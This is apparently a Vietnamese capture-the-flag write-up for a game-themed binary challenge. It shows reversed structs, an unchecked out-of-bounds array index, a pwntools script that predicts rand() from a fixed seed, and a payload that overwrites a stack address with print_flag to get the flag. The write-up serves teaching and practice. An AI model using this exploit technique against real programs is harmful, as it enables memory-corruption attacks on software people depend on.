# write up GOA
- đầu tiên cần làm là tạo struct để chương trình có 1 cấu trúc giống source nhất có thể
```c
// struct của trooper và monster
00000000 struct str1 // sizeof=0x10
00000000 {
00000000     char string[8];
00000008     int damn;
0000000C     int health;
00000010 };

00000000 struct str2 // sizeof=0x18
00000000 {                                       // XREF: main/r
00000000     size_t string;
00000008     int damn;                           // XREF: main+8C/o main+426/o
0000000C     int health;
00000010     int not_health;
00000014     // padding byte
00000015     // padding byte
00000016     // padding byte
00000017     // padding byte
00000018 };
```
- struct được tạo dựa trên số bytes của struct được đọc từ chương trình có thể là con số 24 như ở biến monster này
  
```c
    *&monster_88[24 * j - 8] = &decide_value;
    *&monster_88[24 * j] = 32;
    *&monster_88[24 * j + 4] = 16;
    *&monster_88[24 * j + 8] = 256;

```
- và 1 số thông tin khác để xác định 1 cách tương đối những đối tượng của struct thì sẽ rút gọn đc chương trình
- lỗi sẽ nằm ở đây, hero[m].fame_id, đó là out of bound, vì chương trình không có check bound vì vậy em có thể gán giá trị vào các địa chỉ em muốn thông qua hàm str và hero name em nhập
```c
 string = &str[hero[m].fame_id];
 decide_value = *&hero[m].name[8];         // long int decide_value
*string->name = *hero[m].name;
```
trước đó được gán cho số k trong vòng lặp trên
```c
for ( k = 0; k < numsofhero; ++k )
  {
    hero[k].fame_id = k;
    hero[k].damn = 32;
    hero[k].special_damn = 48;
    hero[k].health = 512;
...
```
- chương trình cho phép em nhập numsofhero
```c
puts("How many hero do you want?(0-2)");
  scanf("%d", &numsofhero);
````

- vậy để có thể đến bước gán em phải làm cho hero won
```bash
Monster is lack 80 healths!
┏┓︱︱ ︱︱︱︱ ︱︱︱ ︱︱︱︱   ︱︱︱︱︱︱ ︱︱︱︱ ︱︱︱︱
┃┃︱︱ ︱︱︱︱ ︱︱︱ ︱︱︱︱   ︱︱︱︱︱︱ ︱︱︱︱ ︱︱︱︱
┃┗━┓ ┏━━┓ ┏━┓ ┏━━┓   ┏┓┏┓┏┓ ┏━━┓ ┏━┓︱
┃┏┓┃ ┃┃━┫ ┃┏┛ ┃┏┓┃   ┃┗┛┗┛┃ ┃┏┓┃ ┃┏┓┓
┃┃┃┃ ┃┃━┫ ┃┃︱ ┃┗┛┃   ┗┓┏┓┏┛ ┃┗┛┃ ┃┃┃┃
┗┛┗┛ ┗━━┛ ┗┛︱ ┗━━┛   ︱┗┛┗┛︱ ┗━━┛ ┗┛┗┛
========================
         ⚨ Trooper turn 
========================
Attacking the monster ...
========================
         ☠ Monster turn 
========================
Attack the hero first! Kill the legion commander
```
- để hero won thì có 2 cách, có thể nhập tăng số lượng trooper và hero lên hoặc có thể vượt qua hàm srand và rand trong hàm battle
```c
if ( battle_field(hero, trooper, monster, &decide_value - 396) )
  {
    puts("Big won! The civilian always remember heroes!");
    puts("======== ^ HALL OF FAME ^ =========");
    for ( m = 0; m < numsofhero; ++m )
```

```c
 i = 0;
  j = 0;
  k = 0;
  srand(0x1337u);

...

    puts("Do you wanna attack [1]monster or [0]trooper?(1/0)");
    scanf("%d", &choice);
    if ( choice == 1 )
    {
      puts("Attacking the monster....");
      random = rand() % 2022;
      printf("Guessing monster attack direction to attack\nWhat do you think? > ");
      scanf("%d", &userinput);
      if ( random == userinput )
      {
        printf("Monster is lack %d healths!\n", (hero[i].damn + hero[i].special_damn));
        monster[j].not_health -= hero[i].damn + hero[i].special_damn;
      }
```
- vì srand() và rand() nó random bằng Pseudorandom number generator nên nó không ngẫu nhiên, em chỉ cần dùng seed là 0x1337 như ở bài này và dùng python là có thể vượt qua
```c
def random():
    p.sendlineafter(b'[0]trooper?(1/0)',b'1')
    p.recvuntil(b'the monster....')
    libc.srand(0x1337)
    p.sendlineafter(b' you think? >',str(libc.rand()%2022))
    p.sendlineafter(b'[0]trooper?(1/0)',b'1')
    p.recvuntil(b'the monster....')
    p.sendlineafter(b' you think? >',str(libc.rand()%2022))
    p.sendlineafter(b'[0]trooper?(1/0)',b'1')
    p.recvuntil(b'the monster....')
    p.sendlineafter(b' you think? >',str(libc.rand()%2022))
    p.sendlineafter(b'[0]trooper?(1/0)',b'1')
    p.recvuntil(b'the monster....')
    p.sendlineafter(b' you think? >',str(libc.rand()%2022))
```
- random sẽ được thực hiện trước khi hàm rand được hiện đúng sau hàm in chuỗi xuất hiện
```c
  puts("Attacking the monster....");
```
thì sẽ hiệu quả 
- sau khi vượt qua thì thì em đọc assembly thấy rằng nó lấy giá trị em nhập từ lúc nhập tên hero xong shift left rồi cộng với
địa chỉ phần tử đầu tiên của biến str để truy suất tới đó
```assembly
*RCX  0x12
 RDX  0x7fffffffe5b0 ◂— 0xfffde39800000012

...

*RIP  0x555555556339 ◂— lea rdx, [rbp - 0x120]
 EFLAGS 0x202 [ cf pf af zf sf IF df of ]
─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────
   0x55555555632d    add    rdx, rbp
   0x555555556330    sub    rdx, 0x160
   0x555555556337    mov    ecx, dword ptr [rdx]
 ► 0x555555556339    lea    rdx, [rbp - 0x120]
   0x555555556340    movsxd rcx, ecx
   0x555555556343    shl    rcx, 4
   0x555555556347    add    rcx, rdx
   0x55555555634a    mov    rdx, qword ptr [rax + 8]
   0x55555555634e    mov    rax, qword ptr [rax]
   0x555555556351    mov    qword ptr [rcx], rax
   0x555555556354    mov    qword ptr [rcx + 8], rdx
```
- sau đó nó gán giá trị cho địa chỉ đó cũng từ dữ liệu em nhập vào
```assembly
0x555555556351    mov    qword ptr [rcx], rax
```
- vì vậy em có thể nhập payload như này, vì địa chỉ print_flag có rồi nên em gán luôn 
  ```python 
    p.sendafter(b' your hero?',p8(0x12) + b'\0'*3 +p64(stack)+p32(addr &0xffffffff))
    p.sendafter(b' your hero?',p64(0x12) + b'a'*4 + p16(addr >>32))
  ```
- em phải chia đôi cái địa chỉ ra để gán cho mỗi lần như vậy
```bash
    00000036
Top 19 - \x98\xe3\xfd\xff\xff\x7f


 ========== 𝗕𝗬𝗘 ==========
[DEBUG] Received 0x27 bytes:
    b'Here is your gift: lmao{lmaolmaolmao}\n'
    b'\n'
Here is your gift: lmao{lmaolmaolmao}

$
```
Khi chạy thì lấy được flag rồi =))
- 

